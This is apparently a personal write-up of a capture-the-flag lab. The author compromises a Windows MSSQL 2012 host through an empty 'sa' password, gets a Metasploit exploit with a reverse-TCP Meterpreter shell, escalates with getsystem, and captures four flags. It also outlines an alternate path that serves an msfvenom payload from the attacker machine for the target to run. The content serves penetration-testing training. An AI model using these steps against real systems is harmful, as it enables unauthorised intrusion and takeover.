migraet # Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.

**Objective:** Use Metasploit and manual investigation techniques to capture the following flags:

- **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- **Flag 2:** Locate the second flag within the Windows configuration folder.
- **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- **Flag 4:** Investigate the Administrator directory to find the fourth flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- mssql





**Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.


First flag I see it's asking for here is to access the MSSQLSERVER account on the target machine, lets start with the trusty nmap scan so we get an idea of the full overview on the target!

nmap -sS -sV -O -p- target.ine.local

port 1433 is open which is our Microsoft SQL server which is an idea of where we initially want to begin since we are looking for this account.


![](Screenshots%20CTF%201/nmap%20scan.png)

Next step we want to see here is doing some sort of enumeration on the target, I'm going to prod a little bit on the ms-sql-s service and have a look at some nmap scripts I can utilise to gain some more information on the target. This way I can find more an entry point.

ls -al /usr/share/nmap/scripts | grep -e "ms"

I could run all the scripts including a brute force but I want to see what info I can gather without going straight for brute force.


![](Screenshots%20CTF%201/viewing%20ms-sql-s%20scripts%20on%20nmap.png)

Was making my way through the scripts and came across something pretty interesting..

There's a scrip called "ms-sql-empty-password" which checks for an empty password login for the sysadmin account and what would you know.. there's a success!

I guess there's a lesson learned here for myself not to keep jumping straight to brute force mode!

nmap --script=ms-sql-empty-password target.ine.local

![](Screenshots%20CTF%201/ms-sql-empty%20password%20NSE%20SUCCESS.png)


So now that I have enumerated a good bit of information on the service and now know the version, we can look at exploiting MSSQL.

After opening up msfconsole, I've hit a search for "MSSQL 2012" since I know this is the version that is used and will see what exploits are available.

The one noted and to use is:

exploit/windows/mssql/mssql_crl_payload

It has also configured to a windows 32 bit staged payload.

![](Screenshots%20CTF%201/exploit%20for%20mssql%20used.png)

So now that I have got the exploit loaded, lets check few options so I can ensure this works.

set RHOSTS target.ine.local

Now, because I enumerated via nmap script I know that the username "sa" doesn't require a password as it authenticates without it. Even though the USERNAME and PASSWORD sections are autofilled, I know pre-emptively that this should work rather than just going straight to MSFconsole to an exploit module to not understand the backbone of what's required for it to work.

If you use the info command, it does tell you this anyway but for my own learning I'm happy to have enumerated in the first place to learn this.


![](Screenshots%20CTF%201/info%20command%20on%20exploit%20module.png)


Let's run the module and see what is happening.

Oh an error, it appears our payload is incorrectly set as 32 bit and it requires a 64 bit payload. Easily done, lets change it to a 64 bit staged payload.

set payload windows/x64/meterpreter/reverse_tcp

![](Screenshots%20CTF%201/run%20error%20and%20change%20to%2064%20bit%20payload.png)

Now that we have run the module, we now have a meterpreter session!

I have also ran some commands within the meterpreter shell to confirm system info and what our username is! 

![](Screenshots%20CTF%201/exploit%20module%20success.png)


Having a snoop about the system we are in, my main goal now is to find the first flag!

Admittedly I got too excited and went ahead to find the flag without taking a screenshot of my work, so I went back and created another shell process just for the sakes of getting a clear screenshot so that's why you see channel 2 created!

by navigating to the root of the C: drive, flag1.txt sat in all it's glory. Get it captured!

shell - (In meterpreter)
cd C:\
type flag1.txt

![](Screenshots%20CTF%201/flag1%20CAPTURED.png)






















**Flag 2:** Locate the second flag within the Windows configuration folder.


Well this should be an easy flag right? all we need to do is change directory to the config one?

Well if only..


![](Screenshots%20CTF%201/trying%20config%20directory.png)

Okay so well it should have been obvious since we are not a privileged user, we now can look at escalating our privileges to be able to get into this directory.

Let's see what accounts are on this machine.

![](Screenshots%20CTF%201/net%20user%20and%20local%20group%20commands.png)


so we know we have Administrator and ssm-user who are a part of the local group Administrators.. we now have a target.

Let me check what privileges we have on this, surely this will give us a foot forward on exactly how we can proceed.

Bingo. We can impersonate a user!

![](Screenshots%20CTF%201/whoami%20priv%20command.png)


So thinking I was going to impersonate the token and then I would be on my merry way to an easy escalation, a problem occurred..

After loading incognito in on meterpreter and ran the command "list_tokens -u" to see if I could impersonate either of these users. The only delegation token available was the MSSQLSERVER account.

![](Screenshots%20CTF%201/list_tokens%20-u.png)

I knew from playing around with a few other labs that I can use the "getsystem" command in the meterpreter shell, to save my time and sanity I typed this in and voila. Escalated privileges. I am the system now.

I read more on this so I understood exactly what was going on here: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)


![](Screenshots%20CTF%201/PRIV%20ESC%20SUCCESS.png)

To make it easier for myself here, I wanted to drop back into shell and change directory to config to get this flag.

As expected, there it is just waiting for me :)

![](Screenshots%20CTF%201/FLAG%202%20captured.png)
























**Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.


Okay so the hint here is within the system directory.. I'm guessing I now need to look around within the system32 directory to find out where this flag is.

Now if you've tried to look in the system32 directory and other sub directories it is flooded with a tonne of different things it's easy to get lost within it all.

I decided to use a command to try check all of the system32 directory for files ending in .txt recursively.


dir C:\Windows\System32\*.txt /s /b

Now the flag was spotted here as "EscalatePrivilageToGetThisFlag.txt".. I'm already big system man so easily get this flag captured :D


![](Screenshots%20CTF%201/Flag%203%20captured.png)

















**Flag 4:** Investigate the Administrator directory to find the fourth flag.


Investigate the Administrator directory, this should be easy enough since we are the system account all I need to do is get to the administrator directory.

Sure enough it was just as easy as poking my nose in at some od the directories to see what was there, flag 4 just chilling there. SUBMITTED!



![](Screenshots%20CTF%201/FLAG%204%20captured.png)


All flags captured!

Not going to lie, I was stumped a bit on flag 3 as I thought surely using "getsystem" in the meterpreter shell wasn't the right way.. 

I also understand that I could have navigated this entirely via the meterpreter shell which would be more stealthy but I'm trying to be as comfortable with windows commands as much as I am with linux commands.


Alt way to gain a meterpreter session:

- use auxiliary/admin/mssql/mssql_exec
- create a payload via msfvenom
- set a meterpreter listener via MSF (multi/handler)
- set up a python server via local kali machine
- set the CMD variable in the mssql_exec module to target the kali linux .exe payload and then execute on the system
- gain meterpreter shell on multi/handler


![](Screenshots%20CTF%201/All%20flags%20captured.png)